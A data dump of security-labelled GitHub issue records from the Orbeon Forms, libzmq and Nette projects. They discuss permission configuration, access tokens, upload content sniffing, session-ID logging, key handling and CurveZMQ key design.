[+1 from customer](https://3.basecamp.com/3600924/buckets/12679874/messages/2597150447#__recording_2604335748)","+1 from customer or oauth

Support at least for:

- HTTP service calls
- `send` actions
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,174084046,"Enable Reindex button only with admin role","Currently, we show the admin operations if at least one listed form supports admin operations. This includes the Reindex button.

However, the Reindex button is special:
- It currently doesn't apply to a particular form definition
- it is a time-consuming and a bit dangerous (if updates to the database take place while it's going on) operation

We should show that button only for certain users.

We don't yet have a fully general-purpose permissions system, but we could maybe have a separate property to specify one or more roles the user must have to enable this button (such as `orbeon-admin`).
",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,320091741,"Restrict the use of the `oxf:` protocol","In order to prevent more access, even with the ability to edit the source code of the form definition, we should have the ability to prevent the use of the `oxf:` protocol at the entire model level.

See also #3577.","Users might add models, but `components.xsl` annotates models so could add the necessary attributes.",no,"Module: Form Runner,Module: Form Builder,Module: XForms,Area: Security,"
orbeon/orbeon-forms,173881013,"FB: Validate changing app/form name against roles when editing source",,"We could check at two points:
1. Upon publishing.
   - We should probably always check upon publishing, since that's what matters the most for security purposes.
   - We would just show the Publish dialog with a disabled ""Publish"" button and a warning.
2. Upon applying changes to the source.
   - But we should also enforce it upon applying changes to the source, since that would violate a constraint which is currently enforced in the Form Settings.
   - How would the UI look like?
     - Prevent saving the source if the app/form name are not allowed?
     - Override app/form name with a warning?
[+1 from customer](https://3.basecamp.com/3600924/buckets/7545500/messages/1415108303)",no,"Module: Form Builder,Area: Security,"
orbeon/orbeon-forms,40284147,"Per-app and global permissions configuration","Currently, permissions can only be configured per form, and in Form Builder. We would like to extend that. Proposal:
- do this with JSON properties
- later, we'll have a general UI to update properties

Currently, the XML stored in the form looks like this:

``` xml
<permissions>
    <permission operations=""read update"">
        <group-member/>
    </permission>
    <permission operations=""read update"">
        <owner/>
    </permission>
    <permission operations=""create""/>
    <permission operations=""read update delete"">
        <user-role any-of=""manager""/>
    </permission>
</permissions>
```

_NOTE: The permissions are top-level in the XML, and have an_ or _meaning. They are designed this way for future extensibility, so that new condition types could be added. For example one could write (don't pay too much attention to the specific condition syntax):_

``` xml
<permission operations=""read update"">
    <group-member/>
    <condition xpath=""//type = 'gaga' and document-age-days() gt 10""/>
</permission>
```

The JSON configuration could look like:
1. the current FB UI, which is easier to understand
2. or like the current XML data, which is more extensible

``` json
[
    {                                  ""permissions"": ""create""                    },
    { ""standard-role"": ""owner"",        ""permissions"": ""read update""               },
    { ""standard-role"": ""group-member"", ""permissions"": ""read update""               },
    { ""user-role"":     ""manager"",      ""permissions"": ""create read update delete"" }
]
```

Or:

``` json
[
    { ""operations"": ""read update"",        ""conditions"": [ { ""name"": ""owner"" } ]                          },
    { ""operations"": ""read update"",        ""conditions"": [ { ""name"": ""group-member"" } ]                   },
    { ""operations"": ""create""                                                                             },
    { ""operations"": ""read update delete"", ""conditions"": [ { ""name"": ""user-role"", ""any-of"": ""manager"" } ] }
]
```

We would then just need to check properties in `FormRunnerPermissions.authorizedOperationsBasedOnRoles` if the form itself doesn't have permissions.

Property could be:

``` xml
<property as=""xs:string""  name=""oxf.fr.permissions.*.*"">
    [ … ]
</property>
```
","In addition, the Home page should provide visibility on actual permissions.
[+1 from evaluator](https://mail.google.com/mail/u/0/#inbox/1556ee2dd8ff9427)
Permissions are currently checked in `persistence-model.xml`, calling with `xxf:instance('fr-form-metadata')/permissions`:

``` xpath
frf:xpathAllAuthorizedOperations()
frf:allAuthorizedOperationsAssumingOwnerGroupMember()
frf:authorizedOperationsBasedOnRoles()
```

All functions are implemented in `FormRunnerPermissions`. They call:
- `allAuthorizedOperations()`
  - calls `authorizedOperationsBasedOnRoles()`
  - also checks `owner` and `group-member`
- `authorizedOperationsBasedOnRoles()`
  - checks roles

In all these cases, when no `permissions` element is provided, we would instead obtain the permissions from properties.

If the format in properties is JSON, it would be good to convert both XML and JSON to a Scala representation, so the code checking permissions is not duplicated.
With #2256, we were planning to have a different representation for permissions when using the workflow feature. So we might have two different initial formats for permissions: the current one and the workflow one (when workflow feature is in use). The idea, in that case, was to ""generate workflow config from existing permissions config"" in the form definition.

But we also wanted to ""strip workflow from metadata column / metadata.xml and only keep short permissions"" at runtime, which is what interests us here. Would that ""short permissions"" format be like the current format, or different?

If think that for now, if we want to implement this issue before #2256, we would just pick a JSON format and convert to the current XML format. If #2256 creates a new ""short format"", we can adapt. Anyway we will need the ability to keep supporting the current format if we introduce a new one.
Steps:
- [x] pick JSON format for use in properties (and maybe, later in form definition)
- [x] convert from JSON to Scala representation
- [x] update `FormRunnerPermissions`
  - [x] read permissions from properties if no permissions specified in form definition
  - [x] check permissions based on Scala representation
- [ ] docThe format should also support:
- conjunctions of conditions (#2420), even if that's just for future extensibility
- value-based checks

Could you say:

``` json
""standard-role"": ""group-member"", ""user-role"": ""manager""
```

Which would translate into ""must be group member AND have `manager` role"". Disjunctions can be  implemented by adding multiple lines, probably.

For value checks, we could use an array of `name`/`value` objects:

``` json
""value-match"": [
  {
    ""name"":  ""xh:head/xf:model[@id = 'fr-form-model']/xf:instance[@id = 'fr-form-metadata']/*/application-name"",
    ""value"": ""orbeon""
  },
  {
    ""name"":  ""xh:head/xh:head/xf:model[@id = 'fr-form-model']/xf:instance[@id = 'fr-form-metadata']/*/form-name"",
    ""value"": ""bookshelf""
  }
]
```

The example above would relate to a Form Builder permission to access `orbeon/bookshelf`.
[+1 from customer](https://3.basecamp.com/3600924/buckets/5300917/messages/1619052500)[+1 from customer](https://3.basecamp.com/3600924/buckets/1966556/messages/1970510227#__recording_2118819711) for default permissions[+1 from customer](https://3.basecamp.com/3600924/buckets/7993860/messages/2387911202)[+1 from customer](https://3.basecamp.com/3600924/buckets/23878674/messages/5168267407) in the context of #5397I'd suggest that the JSON format follow something close to the current Form Builder UI for permissions. I am not sure if the scenario where we want to enable a conjunction of conditions (#2420) is important or not, or how it relates to the workflow permissions. But a simple format matching what we have now would be something like this:

```json
{
  ""anyone"": [ ""create"" ],
  ""owner"": [ ""read"", ""update"" ],
  ""group-member"": [ ""read"", ""update"" ],
  ""roles"": [
    {
      ""role"": ""orbeon-user"",
      ""permissions"": [ ""read"", ""update"", ""list"" ]
    },
    {
      ""role"": ""orbeon-admin"",
      ""permissions"": [ ""read"", ""update"", ""delete"", ""list"" ]
    }
  ]
}
```

Or maybe:

```json
{
  ""anyone"":       { ""permissions"": [ ""create"" ] },
  ""owner"":        { ""permissions"": [ ""read"", ""update"" ] },
  ""group-member"": { ""permissions"": [ ""read"", ""update"" ] },
  ""roles"": [
    {
      ""role"": ""orbeon-user"",
      ""permissions"": [ ""read"", ""update"", ""list"" ]
    },
    {
      ""role"": ""orbeon-admin"",
      ""permissions"": [ ""read"", ""update"", ""delete"", ""list"" ]
    }
  ]
}
```

Or even:

```json
{
  ""anyone"":         [ ""create"" ],
  ""owner"":          [ ""read"", ""update"" ],
  ""group-member"":   [ ""read"", ""update"" ],
  ""roles"": {
    ""orbeon-user"":  [ ""read"", ""update"", ""list"" ],
    ""orbeon-admin"": [ ""read"", ""update"", ""delete"", ""list"" ]
  }
}
```

The last format is the most concise. It's fairly consistent.

I suggest that it's better to split permission tokens in an array, rather than:

- using a space-separated string
- or something more complicated like `{ ""read"": true, ""update"": false }`
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,2 Points,"
orbeon/orbeon-forms,1012607772,"Prevent starting filling out a form if before resolving captcha","Currently, the captcha influences the validity of the form, so form authors can stop users from saving or submitting a form before the captcha is filled. This RFE calls for preventing users from even starting to fill out a form before solving a captcha, this primarily to prevent DoS on forms with attachment fields, where users can attach files, which are sent and stored on the server, this before having solved a captcha.

[+1 from customer](https://3.basecamp.com/3600924/buckets/14122811/messages/4070608144)",,no,"Type: RFE,Area: Security,"
orbeon/orbeon-forms,345937696,"Provide API and/or UI for credentials","Something like [Vault](https://github.com/hashicorp/vault) might be worth looking into.","[+1 from customer](https://3.basecamp.com/3600924/buckets/1966717/messages/1203203482#__recording_1210255573)We have some credentials we store in properties right now:

- `oxf.crypto.password`
- `oxf.http.ssl.keystore.password` (when in use)

In addition, credentials to call services are often embedded into the forms, or in base URLs in properties-local.xml.
See also #3632.If a Java API, we already have something similar for virus scanning, see #2855.A suggestion from customer is to have a system of aliases:

- a Form Runner / Form Builder configuration allows you to set user aliases
- you refer to those aliases from Form Builder
",no,"Type: RFE,Area: Security,"
orbeon/orbeon-forms,38910305,"Upload: assign mediatype based on content sniffing","- it's never reliable to depend on the client
- see also [this article](http://techblog.procurios.nl/k/news/view/15872/14863/mimetype-corruption-in-firefox.html)

[+1 from customer](https://basecamp.com/1721271/projects/4504110/messages/28581380)
","For sniffing the media type on the server, [Apache Tika](http://tika.apache.org/) seems to be a good option.

[+1 from customer](https://basecamp.com/1721271/projects/2789956/messages/26991194)
Would be a really useful one but as of 2014-07, both customers don't have this high on their priority list.
[+1 from customer](https://3.basecamp.com/3600924/buckets/2192969/messages/2371554073)[+1 from customer](https://3.basecamp.com/3600924/buckets/6794635/messages/2476910169)One issue with Apache Tika is that it will pull in *many* dependencies. See the [`pom.xml`](https://github.com/apache/tika/blob/master/tika-parsers/pom.xml).The main worry with adding many dependencies is security vulnerabilities. So we should attempt to control which exact formats we support and only take in a few external dependencies. For example, we probably don't need to detect Ogg Vorbis formats out of the box. But we need:

- PDF
- common image/video/audio formats
- Excel/Word (maybe we can just extract the relevant code from POI)
- plain text formats
A quick list of dependencies this would add:

```
org.gagravarr.vorbis-java-tika
org.tallison.jmatio
org.apache.james.apache-mime4j-core
org.apache.james.apache-mime4j-dom
org.apache.commons.commons-compress
org.tukaani.xz
com.epam.parso
org.brotli.dec
com.github.luben.zstd-jni
commons-codec.commons-codec
org.apache.pdfbox.pdfbox
org.apache.pdfbox.pdfbox-tools
org.apache.pdfbox.preflight
org.apache.pdfbox.jempbox
org.apache.poi.poi
org.apache.poi.poi-scratchpad
org.apache.poi.poi-ooxml
com.healthmarketscience.jackcess.jackcess
com.healthmarketscience.jackcess.jackcess-encrypt
org.ow2.asm.asm
com.googlecode.mp4parser.isoparser
de.l3s.boilerpipe.boilerpipe
com.rometools.rome
org.gagravarr.vorbis-java-core
com.googlecode.juniversalchardet.juniversalchardet
org.codelibs.jhighlight
com.pff.java-libpst
com.github.junrar.junrar
org.apache.cxf.cxf-rt-rs-client
org.apache.commons.commons-exec
org.xerial.sqlite-jdbc
org.apache.opennlp.opennlp-tools
commons-io.commons-io
com.googlecode.json-simple.json-simple
com.github.openjson.openjson
com.google.code.gson.gson
org.slf4j.jul-to-slf4j
org.slf4j.jcl-over-slf4j
edu.ucar.netcdf4
org.jdom.jdom2
com.google.guava.guava
edu.ucar.grib
com.beust.jcommander
net.java.dev.jna.jna
org.jsoup.jsoup
com.google.protobuf.protobuf-java
edu.ucar.cdm
org.quartz-scheduler.quartz
com.mchange.c3p0
edu.ucar.httpservices
org.apache.commons.commons-csv
org.apache.sis.core.sis-utility
org.apache.sis.storage.sis-netcdf
org.apache.sis.core.sis-metadata
org.opengis.geoapi
edu.usc.ir.sentiment-analysis-parser
org.apache.ctakes.ctakes-core
org.apache.uima.uimafit-core
org.apache.uima.uimaj-core
org.apache.pdfbox.jbig2-imageio
com.github.jai-imageio.jai-imageio-jpeg2000
```

We already depend on:

```
org.bouncycastle.bcmail-jdk15on
org.bouncycastle.bcprov-jdk15on
org.ccil.cowan.tagsoup.tagsoup
org.tallison.metadata-extractor
org.slf4j.slf4j-api
junit.junit
org.mockito.mockito-core
org.slf4j.slf4j-log4j12
org.apache.httpcomponents.httpclient
org.apache.httpcomponents.httpmime
com.fasterxml.jackson.core.jackson-core
com.fasterxml.jackson.core.jackson-databind
com.fasterxml.jackson.core.jackson-annotations
com.github.jai-imageio.jai-imageio-core
```[+1 from customer](https://3.basecamp.com/3600924/buckets/1966556/messages/2491040401)I verified that even with a plain upload field outside of Orbeon Forms, the `File` object's `type` is blank when using for example  a `.msg` extension, while it is present for things like images.

Besides content sniffing, we could also use the filename extension to guess a content type if the browser doesn't send one, or as a replacement for the type sent by the browser.",no,"Type: RFE,Module: XForms,Area: Security,Top RFE,"
orbeon/orbeon-forms,47304290,"Prevent multiple sends","Scenario:
- new
- user presses ""Send"" button
- navigate to confirmation page
- user does browser back
- user presses ""Send"" button again

After a `send`, there should be an option (or by default) to mark the form as sent. This could be built into the `send` action, or be a separate action, like `set-form-state(state = ""sent"")` (and we could have things like `set-form-state(state = ""readonly"")`).

This way, when a user does a browser back, the page would show, but visually it might not show form data (for force readonly) but show a message saying that form data was sent, thank you.

_NOTE: We agree with this [SO question](http://stackoverflow.com/questions/12381563/how-to-stop-browser-back-button-using-javascript) that trying to prevent browser back should be avoided._

Issues:
- If new → review → confirmation, and browser does back → back, state would not be available in restored new page. Is this a real issue?

Other possibility: it would be possible, upon `send` or after, to remove the document from cache. This way the document would show, but fail to restore, and ""Send"" wouldn't work. But this would seem to be quite broken behavior. The main option above seems better.
- [+1 from customer](https://basecamp.com/1721271/projects/3412232/messages/32958499)
- [+1 from discuss](http://discuss.orbeon.com/How-to-implement-a-custom-quot-Finish-page-quot-best-td4659431.html)
","We have this property, which upon browser back/refresh does a reload instead:

``` xml
<property as=""xs:string"" name=""oxf.xforms.revisit-handling"" value=""reload""/>
```
Related, although not quite a duplicate I think: #1726.
See also  #2514, #1908.[+1 from customer](https://3.basecamp.com/3600924/buckets/4224335/messages/1462309189#__recording_1462616395)For now keeping as a separate RFE, as workflow stages (#2256) will not do this automatically. See #2514 for the umbrella issue.",no,"Module: Form Runner,Area: Security,Area: Usability,"
orbeon/orbeon-forms,1363925006,"Ability to require access token","- When accessing a form, if an access token is required:
    - It needs to be provided on the URL, e.g. `?orbeon-access-token=159b0c4aee9a825be489507183f1cec03951da63`
    - As soon as the page is loaded, the `orbeon-access-token` is removed from the URL (`History.replaceState`)
- The access token is computed and verified as follows
    - It is computed by combining the following pieces of information: app name + form name + form version + document id + expiration timestamp
    - The expiration timestamp is computed as `current-dateTime()` + duration from the `oxf.fr.access-token.validity.*.*`
    - This combination is encrypted with the access token key, from `oxf.fr.access-token.key.*.*`
    - The access token is verified by decrypting it with the access token key, and verifying that the app name, form name, form version, and document id correspond to the document the user trying to access, and that the expiration timestamp is in the future
- Changes to the `fb:parameter-editor`
    - For Edit and View page, add a checkbox ""Include access token""
    - (It's up to the form author to make sure they don't include the token for logged in users, if they don't want)
    - (The `fb:parameter-editor` is used in the Email Settings, Control Settings, and Section/Grid Settings dialog)
- Permissions dialog
    - The Permissions dialog is changed as follows
        - Anyone
            - Require token
        - Any authenticated user
        - Owner
        - Group
        - Role a
    - Checkbox logic
        - ""Anyone"" without ""Require token"" implies all the checkboxes on the same column are checked and readonly
        - (The above implied checkboxes are dealt with in the same as the existing implied checkboxes, aka ""virtually checked"")
- Out of scope for this RFE
    - The ability to invalidate specific tokens
    - Requiring an access token to fill out a new form
        - In that case the access token just wouldn't contain the document id, and such an access token would only be usable to fill out a new form
        - Use case: skipping having to create data for that user before we send the link, maybe providing some initial data in request parameters
    - An API to generate an access token for a given app, form, version, document id
    - In `fb:parameter-editor`, a way to dynamically determine whether an access token is included in the URL

[+1 from customer](https://3.basecamp.com/3600924/buckets/23878674/messages/5289266047)

","I changed the title and the above description for this RFE based on some brainstorming done with @ebruchez today.We discussed more with @avernet today. There is some trade-off between two options:

- stored tokens
- computed tokens

For reference, [RFC 9068](https://datatracker.ietf.org/doc/html/rfc9068) ""defines a standard way to use JWTs as access tokens"", and this [OAuth doc](https://www.oauth.com/oauth2-servers/access-tokens/self-encoded-access-tokens/) discusses ""self-encoded tokens"".Following discussion, there are the reasons we wouldn't want to use JWT:

- it requires a private/public key setup, which we don't want to require at this time
- tokens might be much larger
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,1184917889,"Add a mechanism to stop LifecycleLogger.scala from logging out value of JSESSIONID","Orbeon logs out value of JSESSION id cookie:

2022-03-25 08:52:48,458 org.orbeon.oxf.logging.LifecycleLogger$.event(LifecycleLogger.scala:103)  INFO  lifecycle - event: {""request"": ""1"", ""session"": ""EB57E453E2A45DFB5256F82031F60D87"", ""source"": ""service"", ""message"": ""start: handle""}

According to [OWASP v4.0.3 V7.1.1](https://github.com/OWASP/ASVS/blob/v4.0.3/4.0/en/0x15-V7-Error-Logging.md#v71-log-content):

> Verify that the application does not log credentials or payment details. Session tokens should only be stored in logs in an irreversible, hashed form.

Problem is that whoever has access to logs could take over user's session.

Possible solutions:
* add a configuration key to replace value of JSESSIONID with ""***"" or with a hashed value of JSESSIONID
* log out JSESSIONID with a different logger (so it would be able to exclude it from being logged out).


","I think that's a reasonable suggestion.",no,"Area: Security,"
orbeon/orbeon-forms,21935500,"FR Home: don't show remote info for forms w/o admin permission","E.g. on attached screenshot, we see remote Status and Modified information. Those should be N/A.

![screen shot 2013-10-31 at 4 50 12 pm](https://f.cloud.github.com/assets/105769/1450883/3ff4d236-4287-11e3-8d68-dc229023a3f1.png)

Also on this screenshot, if the form is only available remotely, the row must not be shown.

![screen shot 2013-10-31 at 5 04 27 pm](https://f.cloud.github.com/assets/105769/1451002/5a18f00e-428a-11e3-9fc9-3751d8435014.png)
",,no,"Module: Form Runner,Area: Security,1 Point,"
orbeon/orbeon-forms,104617803,"Out of the box solution to protect Orbeon WAR when using proxy portlet","We are recommending an IP filter for example using [UrlRewriteFilter](http://cdn.rawgit.com/paultuckey/urlrewritefilter/master/src/doc/manual/4.0/index.html), but we don't document it and it's not out of the box.
","This needs some further thinking.
",no,"Area: Security,Module: Portlet support,"
orbeon/orbeon-forms,174140204,"Umbrella: Improved permissions","Covers the following related issues:
- Per-app and global permissions configuration #1860
- Permissions based on field value #1487
- Separate Form Builder and Home page permissions #2906
- FB permissions must specify CRUD operations #1149
- Enable Reindex button only with admin role #2905
","#1860 can be implemented no matter what.

One that is done, it will be possible to setup CRUD Form Builder permissions independently from `form-builder-permissions.xml`.

However, this will not cover value-based permissions, which requires #1487.

We can then do #2906/#1149 and deprecate `form-builder-permissions.xml`.
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,182134063,"Option to cleanup field values, to avoid XSS","In some cases, field values may be shown by other apps, where they may not be properly escaped. Thus in certain cases, to avoid possible risks of XSS, users would like Orbeon Forms to filter out values containing text, like `<script>`, which could be used for XSS.

This should be an option, and could be enabled globally on a per app/form basis through a property, for a given form in Form Builder's Form Settings dialog, or per field in the relevant field's Control Settings.

[+1 from community](http://discuss.orbeon.com/call-clean-html-xpl-for-whole-instance-td4661830.html)
",,no,"Module: Form Runner,Type: RFE,Area: Security,"
orbeon/orbeon-forms,46423182,"Improve authentication scenarios","Issues:
- [ ] Support requiring authentication for summary page but not new page #1292 
- [ ] Per-app and global permissions configuration #1860
",,no,"Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,1087946348,"Import page: consider improving permissions","Following #2840 security considerations, should we prevent access to `/import` if the user doesn't have `create` permissions for the given form?

For an import which just requires `create` permissions, we could:

- require that the user has `create` permission for the given form
- or consider that the user is a sort of ""admin"" always able to create
  - but we don't have a way to represent that permission
  - in general, we should have permissions such as ""has access to the import page"" and ""has access to the admin page""

Being able to create data is not as much of a problem as being able to read or modify data. So we can defer this question to a separate issue.
",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,17284290,"FB permissions must specify CRUD operations","Right now, there is confusion with the support for `form`. As the [doc](https://sites.google.com/a/orbeon.com/forms/doc/developer-guide/form-runner/access-control?pli=1#TOC-Access-to-specific-apps-forms-in-Form-Builder-form-builder-permissions.xml-) says:

""Restrictions on the form name in form-builder-permissions.xml are at this point not supported; only restrictions on the app name are supported. This means that you should always use `form=""*""`. If you define a restriction on the form name, it won't be enforced at the time the form is created, allowing users to create, save, and publish a form with an undesirable name. However they then won't be able to see the form they created when going back to the summary page.""

This would be solved with more specific CRUD operations:
- user can `read` and `update` a form definition
- user cannot `create` a new one

Might need an additional `publish/unpublish` permission?

Ideally, this should be unified with the FR permissions.
","[+1 from potential customer](https://mail.google.com/mail/u/0/#inbox/141ebb9ef16232bd).
",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,21918758,"FR Home: discrepancy with Summary permissions","Permissions setup  from test plan.
- Anyone → create
- orbeon-sales → Read and Update
- add Owner → Read

For `orbeon-user`, sales/my-sales-form has link to Summary, but Summary does a 403. The link should not be there, following the same logic that is in the Summary page.
",,no,"Module: Form Runner,Area: Security,2 Points,"
orbeon/orbeon-forms,21557610,"FB: Add permission to publish a form","See [thread](http://discuss.orbeon.com/How-to-disable-the-Publish-button-in-orbeon-form-builder-and-role-access-it-td4657544.html).
",,no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,556385401,"Ability to control services accessible by Form Builder/Form Runner","[+1 from customer](https://3.basecamp.com/3600924/buckets/7044591/messages/2369146654)

Format of the whitelisting TBD. Squid has a very simple format where you just list domains, possibly with a leading `.`:

    acl whitelist dstdomain .whitelist.com .goodsite.com .partnerssite.com

The following would be useful:

- wildcards
- blacklisting
- filtering based on paths as well, not only domains
",,no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,"
zeromq/libzmq,32484408,"Problem: libzmq doesn't implement ERROR commands","Solution: the stream engine should send back an ERROR command (see RFC 23) when there's a protocol or access error. The ERROR command carries a text explanation, which can be ""protocol error"" or ""access refused"".
","In case of ZAP errors, this is done now, but not in other cases, e.g. in case of a mechanism mismatch.",no,"Feature Request,Area (Runtime / Usage),Security,"
zeromq/libzmq,39363889,"Secret keys should be stored in memlock'd memory only","To avoid risk of private keys being swapped to disk, the memory storing them should be memlock'd.

zmq_z85_{decode,encode} should probably insist on using registers for sensitive key data as well.
","Hello,
`zmq_z85_{encode,decode}` are, in my opinion, general purpose encoding and decoding function. I don't think they should take special care about how they manipulate data. Maybe a secure version of those functions could be provided if there is need for it.

I think preventing critical data from being swapped to disk is not the library role, and swap should be encrypted if writing data to it can be problematic.
libsodium has cross platform support for guarded heap allocations, since zeromq uses it all that would be necessary would be to use sodium_malloc and sodium_free instead of the normal malloc and free.
For extra security those pages could be locked while they are not needed aka sodium_mprotect_noaccess and sodium_mprotect_readonly.

http://doc.libsodium.org/helpers/memory_management.html
",no,"Feature Request,Area (Runtime / Usage),Area (API change),Security,"
zeromq/libzmq,267392630,"Make ZAP usage control explicit","As discussed in #2762, replace ZMQ_ZAP_ENFORCE_DOMAIN by ZMQ_ZAP_USAGE or similar.","This issue has been automatically marked as stale because it has not had activity for 365 days. It will be closed if no further activity occurs within 56 days. Thank you for your contributions.
This should still be improved.",no,"Area (Runtime / Usage),Area (API change),Security,Problem reproduced,"
zeromq/libzmq,32484485,"Problem: connection retries forever after authentication failure","Solution: when the server replies with ERROR (see #989), the client should not reconnect.
",,no,"Feature Request,Area (Runtime / Usage),Security,"
zeromq/libzmq,221464902,"Associating multiple public keys to one listener socket in CurveZMQ","Right now while using CurveZMQ, client needs to know the server public key and server can have only one public key.

Sample server code

```
listener = ctx.socket(zmq.ROUTER)
publicServer, secretServer = get_keys()
listener.curve_secretkey = secretServer
listener.curve_publickey = publicServer
listener.curve_server = True
```

Sample client code

```
sock = context.socket(DEALER)
sock.curve_publickey = localPubKey
sock.curve_secretkey = localSecKey
sock.curve_serverkey = publicServer
```

But what if we needed the server to have a unique public key for each client, i know it does not make sense in a client server pattern, but consider a peer to peer communication where peers have pairwise connection and each peer has a unique keypair for another peer, now we can have multiple listeners for each keypair (peer) but that restricts to 64K (since each listener binds to one port). Does CurveZMQ have a hook that i can use to check for the public key for any peer connection, its like plugging in a keystore in CurveZMQ. I am using zeromq 4.1.2. Thanks

**UPDATE:**
Example Scenario: Bob and Carol want to talk to Alice but Alice does not want them to know that they talked to the same person (Alice) hence she decides to use give 2 different public keys to Bob and Carol, Pb and Pc respectively. Now Alice opens up 2 listeners on 2 different ports 9701 and 9702 and associates Pb to 9701 and Pc to 9702. Now Bob connects to Alice on port 9701 using key Pb and Carol connects to Alice on port 9702 using key Pc, now even if Bob and Carol communicate and try to decide if they talked to the same person, they cannot (Assume Alice can make the IPs look different to Bob and Carol). But Alice has consumed 2 ports numbers, 9701 and 9702. This is fine until Alice has to talk to only, say few hundred people but if Alice wanted to talk to 100K people, it can generate 100K different keys but wont be able to allocate 100K different ports? So is it possible to use only one port and somehow decide on the fly when the message arrives which keypair to use? ","Yes, see https://rfc.zeromq.org/spec:27/ZAP/You can, and if you use CZMQ it's made quite simple with the zcert classes:

https://github.com/zeromq/czmq/blob/master/examples/security/ironhouse2.c@bluca I still cannot see how the server could use different public keys for different clients. I have updated the description, maybe that makes the scenario clear.@evoskuil I could not see how, can you please say a little more? Do you mean using Proxy Handlers, Thanks
Sorry from the first description I thought you meant having the clients public keys on the server for authentication, ie the ironhouse pattern

A server can only have one public key AFAIK.
Also I don't see how having multiple public keys would be useful, as the endpoint would have to be the same anyway so there's no additional privacy added. You can use multiple servers if that's what you need.@bluca Endpoint can be made different, right? If my networking infrastructure can make sure that connections in the IP range 52.133.x.x to 52.139.x.x for all ports route to the same listener socket, then clients connecting cannot figure out if they are talking to same person or notThen your firewall that does that NATting will be the single entry point shared by all clients, so again no point
But if you really want to do that, just use multiple server sockets@bluca What if there are multiple **Alice**s (Servers)? So Alice has 3 brothers and 2 sisters called b1, b2, b3, s1 and s2. Now Bob and Carol should not know if they are talking to Alice or to one of its siblings Actually they should: https://en.wikipedia.org/wiki/End-to-end_principle

But besides that, a per-client server public key simply does work in the Curve mode, please read the spec:

https://rfc.zeromq.org/spec:26/CURVEZMQIn a p2p context everyone can have 1 private key and the public keys of all others. Using authentication a peer can the restrict which peers may connect to its endpoint. The configuration would require that each peer use its private key to establish both the ""sever"" and ""client"". This could be done with distinct keys as well, but that's unnecessary.For this use case we came up with the following plan.


_Every Client of a particular CurveZMQ server is configured with a unique Server Public Key.
CurveZMQ Server is configured to point to a list of Long Term Key Pairs instead of a single {s, S}
{s1, S1} , {s2, S2}, . . . . {sx, Sx}, . . . {sn, Sn} 

At the start of communication, a particular client 'x' sends a modified HELLO to the server. The modified HELLO includes additional 32 OCTETs which is the server long term public key.

On receiving the Hello the server looks up the public key Sx and locates the corresponding secret key sx and associates that key with the client for all further communication.

Rest of the Commands WELCOME, INITIATE, READY MESSAGE all continue as usual except they use the particular secret key sx and expect particular public key Sx to be used for all communication with that particular client_


I would like some feedback from you folks, do you see a security issue here of any kind or any other issue.Aside from any security issue, the main problem is that it's a backward-incompatible change in the protocol :-/> At the start of communication, a particular client 'x' sends a modified HELLO to the server. The modified HELLO includes additional 32 OCTETs which is the server long term public key.

@FarooqKhan  

I see two important problems with this design:
- this leaks the server public key and allows an eavesdropper to generate valid HELLO commands. This would require the server not only to verify the client signature box but (since this is valid) also generate an ephemeral key pair, which allows an attacker to waste a lot more server cpu cycles.
- this effectively leaks the identity of the client to an eavesdropper (since they all use a unique server public key).

The first problem can be solved by hashing the public key. 

I can see no perfect solution to the second problem. 

You could add a nonce to the hash but this would prevent you from calculating the hash at socket configuration time and require the server to calculate half many hashes as it has server public keys (on average) for every client connection. Way too expensive.

You could use the server endpoint identifier (which is available at socket configuration time) as nonce but then a snooper could still uniquely identify each client as long as the server endpoint remains the same. I consider this to be less of a problem because as long as the endpoint identifier does not change, it is trivial for Bob and Carol to discover they are talking to the same Alice. If this changes regularly (on both sides), a snooper can no longer uniquely identify the client or server. Good enough I'd say (especially since this anonymity will only work with changing IP addresses).
@JoveToo thanks for taking the time to study this and reply. 

To solve the second problem what if we took a Server Public Key split it into Shamir Secret pieces and the client sends the required number of pieces during the HELLO For each new HELLO choosing random pieces of required threshold. The server can use the pieces and construct the Public key since it will always receive the necessary number of parts. How many parts to split in and the threshold can be predefined. The problem does not go away entirely but becomes a little bit difficult, If we split the public key into lots of pieces it does become quite difficult@FarooqKhan 
If you present the server with sufficient number of pieces to reconstruct the public key, the eavesdropper can reconstruct it as well? If you do not present enough pieces, the server still has to evaluate on average half his public keys.You are right its not a solution just postponing the problemI cannot help but think it would make more sense to design a new protocol for this than trying to add this to CurveZMQ.",no,"Feature Request,Request For Comments,Security,Area (Protocol),"
zeromq/libzmq,248025634,"Status text returned by a ZAP handler is masked","The status text returned by a ZAP handler, particularly for status codes other than 200, is masked. It is not accessible by the application nor by an administrator.

It would be good to include it in the corresponding monitor event, but this would require a change to the socket monitor protocol, allowing an alternate or additional information to the address.","There are also other situations, where it might make sense to include an additional description, e.g. for the various ZMTP protocol errors.@sigiesec I think you implemented this, right?No... This is still unresolved. Do you think the monitoring event format can be modified/extended?Mh I guess it would be hard to do without breaking backward compatMaybe require opting in via a context option?We have already so many options...
What if the new (or some of the current draft) events had additional multipart frames?There are only few context options?

Currently, all events are specified as having the same format. I don't think the spec allows additional frames. So it is still incompatible if only done for new/draft events.I know, I just think it gets confusing having options to change behaviour of an API - but it's fine if there's no other wayThis issue has been automatically marked as stale because it has not had activity for 365 days. It will be closed if no further activity occurs within 56 days. Thank you for your contributions.
Did we do this as part of the event v2 API?No, not yet, but the event v2 API enables implementing thisGreat, reopening then",no,"Feature Request,Area (API change),Security,"
nette/nette,27636786,"Alternative login mechanism","There is a note in David's [TODO list](http://forum.nette.org/en/1369-ideas-for-further-development-of-nette) about alternative way to user authentication and one part of it will by quite handy to me - login from database.

I use nice ORM but entities cannot be serialized (what a surprise) so I have to have one more unwanted property `profile` which is set in a secured BasePresenter manualy. It contains all data I need, but there is still `$presenter::$user` which becames confusing now because it no longer holds all proper data.

